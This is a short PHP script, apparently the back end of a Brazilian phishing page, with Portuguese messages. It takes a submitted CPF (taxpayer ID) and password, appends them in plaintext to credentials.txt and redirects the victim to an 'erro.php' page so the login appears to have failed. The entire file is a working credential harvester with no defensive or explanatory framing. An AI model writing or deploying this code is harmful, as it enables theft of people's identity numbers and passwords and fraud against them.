<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $cpf = $_POST['cpf'] ?? '';

    $pass = $_POST['password'] ?? '';


    if ($cpf === '' || $pass === '') {

        die('CPF e senha são obrigatórios!');

    }


    $line = $cpf . ':' . $pass . PHP_EOL;                                                                                                                               
                                                                                                                                                                        
                                                                                                                                                                        
    $file = __DIR__ . '/credentials.txt';                                                                                                                               
                                                                                                                                                                        
                                                                                                                                                                        
    file_put_contents($file, $line, FILE_APPEND | LOCK_EX);                                                                                                             
                                                                                                                                                                        
                                                                                                                                                                        
    echo header("Location: erro.php");                                                                                                                                  
                                                                                                                                                                        
} else {                                                                                                                                                                
                                                                                                                                                                        
    echo "Método inválido.";                                                                                                                                            
                                                                                                                                                                        
}        